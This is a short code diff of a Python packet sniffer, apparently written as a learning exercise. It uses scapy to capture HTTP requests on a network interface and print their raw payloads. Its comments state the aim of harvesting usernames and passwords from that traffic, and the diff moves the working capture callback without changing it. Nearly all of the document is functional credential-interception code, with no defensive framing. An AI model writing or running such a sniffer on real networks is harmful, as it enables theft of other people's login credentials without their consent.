@@ -39,11 +39,19 @@ def sniff(interface):
 # then we are telling the function that for each piece of data you sniff call the another function called process_sniffed_packet()
 
 
-def process_sniffed_packet(packet):   # now here we want to print the packet which has the http request so lets add the if statement
-    if packet.haslayer(http.HTTPRequest):   # so here we are checking that packets has the http.HTTPRequest layer with the help of haslayer() function
+# def process_sniffed_packet(packet):   # now here we want to print the packet which has the http request so lets add the if statement
+    # if packet.haslayer(http.HTTPRequest):   # so here we are checking that packets has the http.HTTPRequest layer with the help of haslayer() function
         # here we can add any layer like if the packet has ethernet layer but here we are checking for the if packets has the http layer
-        if packet.haslayer(scapy.Raw):  # here in the raw because we have the passwrods and usernames thats why we wrote this here
-            print(packet[scapy.Raw].load)   # here we are intrested to print only the raw layer with the load section only because raw layer has the passwords
+        # if packet.haslayer(scapy.Raw):  # here in the raw because we have the passwrods and usernames thats why we wrote this here
+            # print(packet[scapy.Raw].load)   # here we are intrested to print only the raw layer with the load section only because raw layer has the passwords
 # scapy.Raw is the layer whereas the load is the field
+# now only load filed is not enough because some websites still uses the another data which is in the load field so it does not mean that in the field load we will always get the data so here we need some modifications lets see what it is
+# sniff("eth0")
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load)  # here we will check the keyword which is username and password in the fields 
 
 sniff("eth0")
